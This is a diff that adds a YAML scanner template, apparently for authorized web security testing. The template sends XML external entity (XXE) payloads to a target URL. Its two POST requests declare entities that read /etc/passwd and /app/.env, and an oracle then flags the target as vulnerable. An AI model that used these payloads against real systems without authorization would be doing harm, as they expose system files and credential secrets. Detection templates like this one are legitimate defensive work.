@@ -1,0 +1,32 @@
+id: blind-xxe-file-read
+name: XXE File Read Extraction
+severity: critical
+tags: [xxe, injection, data-extraction, wstg-inpv-07, cwe-611]
+inputs:
+  target_url:
+    type: string
+    required: true
+steps:
+  - name: probe_env
+    request:
+      method: POST
+      url: "{{ inputs.target_url }}"
+      headers:
+        Content-Type: application/xml
+      data: |
+        <?xml version="1.0"?>
+        <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+        <root>&xxe;</root>
+  - name: probe_dotenv
+    request:
+      method: POST
+      url: "{{ inputs.target_url }}"
+      headers:
+        Content-Type: application/xml
+      data: |
+        <?xml version="1.0"?>
+        <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///app/.env">]>
+        <root>&xxe;</root>
+oracles:
+  - type: blind_xxe_file_read
+    verdict: VULNERABLE
